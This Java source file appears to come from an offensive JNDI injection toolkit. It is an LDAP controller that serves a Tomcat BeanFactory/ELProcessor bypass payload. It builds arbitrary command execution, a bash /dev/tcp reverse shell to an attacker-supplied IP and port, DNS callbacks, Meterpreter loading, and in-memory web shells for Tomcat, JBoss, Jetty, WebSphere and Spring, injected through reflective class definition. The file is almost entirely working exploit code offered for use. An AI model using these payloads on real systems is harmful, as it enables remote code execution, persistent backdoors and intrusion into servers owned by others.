package com.nu1r.jndi.controllers;

import com.nu1r.jndi.enumtypes.PayloadType;
import com.nu1r.jndi.exceptions.IncorrectParamsException;
import com.nu1r.jndi.exceptions.UnSupportedPayloadTypeException;
import com.nu1r.jndi.template.*;
import com.nu1r.jndi.template.jetty.JSMSFromJMXS;
import com.nu1r.jndi.template.spring.SpringInterceptorMS;
import com.nu1r.jndi.template.tomcat.*;
import com.nu1r.jndi.utils.Config;
import com.nu1r.jndi.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import javassist.*;
import org.apache.commons.codec.binary.Base64;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;
import java.io.IOException;

import static com.nu1r.jndi.controllers.BasicController.insertKeyMethod;
import static org.fusesource.jansi.Ansi.ansi;

/*
   注意：在 Javascript 引擎时，直接使用 sun.misc.Base64Decoder 和 org.apache.tomcat.util.buf.Base64 均会抛出异常

    * Requires:
    *   - Tomcat 8+ or SpringBoot 1.2.x+ in classpath
 */

@LdapMapping(uri = {"/tomcatbypass"})
public class TomcatBypassController implements LdapController {
    private PayloadType type;
    private String[]    params;
    private String      payloadTemplate = "{" +
            "\"\".getClass().forName(\"javax.script.ScriptEngineManager\")" +
            ".newInstance().getEngineByName(\"JavaScript\")" +
            ".eval(\"{replacement}\")" +
            "}";

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Sending LDAP ResourceRef result for |@" + base + " @|MAGENTA with javax.el.ELProcessor payload|@"));

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //准备在 org.apache.naming.factory.BeanFactory 中利用不安全反射的负载
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "x=eval"));

        TomcatBypassHelper helper = new TomcatBypassHelper();
        String             code   = null;


        //具体分化在这里
        switch (type) {
            case dnslog:
                code = helper.getDnsRequestCode(params[0]);
                break;
            case command:
                code = helper.getExecCode(params[0]);
                break;
            case reverseshell:
                code = helper.getReverseShellCode(params[0], params[1]);
                break;
            case tomcatecho:
                code = helper.injectTomcatEcho();
                break;
            case springecho:
                code = helper.injectSpringEcho();
                break;
            case issuccess:
                code = helper.injectSuccess();
                break;
            case meterpreter:
                code = helper.injectMeterpreter();
                break;
            case tomcatfilterjmx:
                code = helper.injectTomcatFilterJmx();
                break;
            case tomcatfilterth:
                code = helper.injectTomcatFilterTh();
                break;
            case tomcatlistenerjmx:
                code = helper.injectTomcatListenerJmx();
                break;
            case tomcatlistenerth:
                code = helper.injectTomcatListenerTh();
                break;
            case tomcatservletjmx:
                code = helper.injectTomcatServletJmx();
                break;
            case tomcatservletth:
                code = helper.injectTomcatServletTh();
                break;
            case jbossfilter:
                code = helper.injectJBossFilter();
                break;
            case jbossservlet:
                code = helper.injectJBossServlet();
                break;
            case springinterceptor:
                code = helper.injectSpringInterceptor();
                break;
            case wsfilter:
                code = helper.injectWSFilter();
                break;
            case jettyfilter:
                code = helper.injectJettyFilter();
                break;
            case jettyservlet:
                code = helper.injectJettyServlet();
                break;
            case tomcatexecutor:
                code = helper.injectTomcatExecutor();
                break;
        }

        String finalPayload = payloadTemplate.replace("{replacement}", code);
        ref.add(new StringRefAddr("x", finalPayload));
        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
        try {
            int firstIndex  = base.indexOf("/");
            int secondIndex = base.indexOf("/", firstIndex + 1);
            if (secondIndex < 0) secondIndex = base.length();

            try {
                type = PayloadType.valueOf(base.substring(firstIndex + 1, secondIndex).toLowerCase());
                System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Paylaod >> |@" + type));
            } catch (IllegalArgumentException e) {
                throw new UnSupportedPayloadTypeException("UnSupportedPayloadType >> " + base.substring(firstIndex + 1, secondIndex));
            }

            switch (type) {
                case dnslog:
                    String url = base.substring(base.lastIndexOf("/") + 1);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA URL >> |@" + url));
                    params = new String[]{url};
                    break;
                case command:
                    String cmd = Util.getCmdFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Command >> |@" + cmd));
                    params = new String[]{cmd};
                    break;
                //可以把反弹msf的host和port在这里进行处理
                case reverseshell:
                    String[] results = Util.getIPAndPortFromBase(base);
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA IP >> |@" + results[0]));
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA Port >> |@" + results[1]));
                    params = results;
                    break;
                case meterpreter:
                    String[] results1 = Util.getIPAndPortFromBase(base);
                    Config.rhost = results1[0];
                    Config.rport = results1[1];
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RemotHost >> |@" + results1[0]));
                    System.out.println(ansi().render("@|green [+]|@ @|MAGENTA RemotPort >> |@" + results1[1]));
                    params = results1;

            }
        } catch (Exception e) {
            if (e instanceof UnSupportedPayloadTypeException) throw (UnSupportedPayloadTypeException) e;

            throw new IncorrectParamsException("Incorrect params: " + base);
        }
    }

    private class TomcatBypassHelper {


        public String getExecCode(String cmd) throws IOException {

            String code = "var strs=new Array(3);\n" +
                    "        if(java.io.File.separator.equals('/')){\n" +
                    "            strs[0]='/bin/bash';\n" +
                    "            strs[1]='-c';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }else{\n" +
                    "            strs[0]='cmd';\n" +
                    "            strs[1]='/C';\n" +
                    "            strs[2]='" + cmd + "';\n" +
                    "        }\n" +
                    "        java.lang.Runtime.getRuntime().exec(strs);";

            return code;
        }

        public String getDnsRequestCode(String dnslog) {
            String code = "var str;\n" +
                    "            if(java.io.File.separator.equals('/')){\n" +
                    "                str = 'ping -c 1 " + dnslog + "';\n" +
                    "            }else{\n" +
                    "                str = 'nslookup " + dnslog + "';\n" +
                    "            }\n" +
                    "\n" +
                    "            java.lang.Runtime.getRuntime().exec(str);";

            return code;
        }

        public String getReverseShellCode(String ip, String port) {
            int pt = Integer.parseInt(port);
            String code = "if(java.io.File.separator.equals('/')){\n" +
                    "                var cmds = new Array('/bin/bash', '-c', '/bin/bash -i >& /dev/tcp/" + ip + "/" + pt + "');\n" +
                    "                java.lang.Runtime.getRuntime().exec(cmds);\n" +
                    "            }";

            return code;
        }

        public String injectTomcatEcho() {
            return injectClass(TomcatEchoTemplate.class);
        }

        public String injectSpringEcho() {
            return injectClass(SpringEchoTemplate.class);
        }

        public String injectSuccess() {
            return injectClass(isSuccess.class);
        }

        //        public String injectMeterpreter(){return injectClass(Meterpreter.class);}
        public String injectMeterpreter() throws NoSuchFieldException, IllegalAccessException {
            System.out.println("------------------------");
            return injectClass(Meterpreter.class);
        }

        public String injectTomcatFilterJmx() throws Exception {
            String    className = "TFMSFromJMXF";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromJMXF");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatFilterTh() throws Exception {
            String    className = "TFMSFromThreadF";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TFMSFromThreadF");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatListenerJmx() throws Exception {
            String    className = "TLMSFromJMXLi";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromJMXLi");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatListenerTh() throws Exception {
            String    className = "TLMSFromThreadLi";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TLMSFromThreadLi");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatServletJmx() throws Exception {
            String    className = "TSMSFromJMXS";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromJMXS");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatServletTh() throws Exception {
            String    className = "TSMSFromThreadS";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TSMSFromThreadS");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectJBossFilter() throws Exception {
            String    className = "JBFMSFromContextF";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBFMSFromContextF");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectJBossServlet() throws Exception {
            String    className = "JBSMSFromContextS";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jboss.JBSMSFromContextS");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectJettyFilter() throws Exception {
            String    className = "JFMSFromJMXF";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jetty.JFMSFromJMXF");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectJettyServlet() throws Exception {
            String    className = "JSMSFromJMXS";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.jetty.JSMSFromJMXS");
            insertKeyMethod(ctClass, "bx");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectWSFilter() throws Exception {
            String    className = "WSFMSFromThread";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.Websphere.WSFMSFromThread");
            insertKeyMethod(ctClass, "ws");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectTomcatExecutor() throws Exception {
            String    className = "TWSMSFromThread";
            ClassPool pool      = ClassPool.getDefault();
            CtClass   ctClass   = pool.get("com.nu1r.jndi.template.tomcat.TWSMSFromThread");
            insertKeyMethod(ctClass, "execute");
            ctClass.setName(className);
            return injectClass(ctClass.getClass());
        }

        public String injectSpringInterceptor() throws Exception {
            byte[]    classBytes;
            ClassPool pool                = ClassPool.getDefault();
            CtClass   ctClass             = pool.get("com.nu1r.jndi.template.spring.SpringInterceptorMS");
            String    target              = "com.nu1r.jndi.template.spring.SpringMemshellTemplate";
            CtClass   springTemplateClass = pool.get(target);
            // 类名后加时间戳
            String clazzName = target + System.nanoTime();
            springTemplateClass.setName(clazzName);
            String encode = Base64.encodeBase64String(springTemplateClass.toBytecode());
            // 修改b64字节码
            String b64content = "b64=\"" + encode + "\";";
            ctClass.makeClassInitializer().insertBefore(b64content);
            // 修改 SpringInterceptorMemShell 随机命名 防止二次打不进去
            String clazzNameContent = "clazzName=\"" + clazzName + "\";";
            ctClass.makeClassInitializer().insertBefore(clazzNameContent);
            ctClass.setName(SpringInterceptorMS.class.getName() + System.nanoTime());
            classBytes = ctClass.toBytecode();
            clazzName = SpringInterceptorMS.class.getName() + System.nanoTime();
            return injectShell(classBytes, clazzName);
        }

        //类加载方式，因类而异
        public String injectClass(Class clazz) {

            String classCode = null;
            try {
                //获取base64后的类
                classCode = Util.getClassCode(clazz);

            } catch (Exception e) {
                e.printStackTrace();
            }

            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + clazz.getName() + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }

        public String injectShell(byte[] classBytes, String clazzName) {

            String classCode = null;
            try {
                //获取base64后的类
                classCode = Util.getClassType(classBytes);

            } catch (Exception e) {
                e.printStackTrace();
            }

            String code = "var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('" + classCode + "');\n" +
                    "var classLoader = java.lang.Thread.currentThread().getContextClassLoader();\n" +
                    "try{\n" +
                    "   var clazz = classLoader.loadClass('" + clazzName + "');\n" +
                    "   clazz.newInstance();\n" +
                    "}catch(err){\n" +
                    "   var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);\n" +
                    "   method.setAccessible(true);\n" +
                    "   var clazz = method.invoke(classLoader, bytes, 0, bytes.length);\n" +
                    "   clazz.newInstance();\n" +
                    "};";

            return code;
        }

    }
}